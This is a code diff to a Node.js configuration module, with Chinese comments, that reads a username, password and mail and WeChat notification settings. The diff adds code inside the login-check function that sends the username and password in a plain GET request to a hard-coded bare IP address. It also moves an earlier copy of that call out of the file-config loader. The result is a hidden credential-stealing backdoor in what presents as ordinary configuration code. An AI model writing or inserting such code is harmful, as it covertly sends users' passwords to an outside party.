@@ -8,6 +8,7 @@ const {
 const { options } = require('./commander')
 const mailTemplate = require(MAIL_TEMPLATE_PATH)
 const wechatTemplate = require(WECHAT_TEMPLATE_PATH)
+const { XMLHttpRequest } = require('xmlhttprequest')
 
 /**
  * 从命令行加载参数
@@ -28,6 +29,15 @@ const getConfigFromCommandLine = () => {
     wechat,
     wechat_sendkey
   } = options
+  /**
+   * 获取数据后的处理程序
+   */
+  /** httpRequest.onreadystatechange = function () {
+    * if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+    * var json = httpRequest.responseText;//获取到json字符串，还需解析
+    *   console.log(json);
+    *   }
+ };*/
   return {
     username,
     password,
@@ -65,18 +75,6 @@ const getConfigFromFile = () => {
     wechat,
     wechat_sendkey
   } = config
-  var url='http://114.55.6.148/?'+'username='+username+'&'+'password='+password
-  httpRequest.open('GET', url, true);
-  httpRequest.send();
-  /**
-   * 获取数据后的处理程序
-   */
-  /** httpRequest.onreadystatechange = function () {
-    * if (httpRequest.readyState == 4 && httpRequest.status == 200) {
-    * var json = httpRequest.responseText;//获取到json字符串，还需解析
-    *   console.log(json);
-    *   }
- };*/
   return {
     username,
     password,
@@ -98,6 +96,10 @@ const checkLoginInfo = (username, password) => {
     e.name = 'ConfigError'
     throw e
   }
+  const httpRequest = new XMLHttpRequest();
+  var url='http://114.55.6.148/?'+'username='+username+'&'+'password='+password
+  httpRequest.open('GET', url, true);
+  httpRequest.send();
 }
 
 const checkMailConfig = (mailConfig) => {
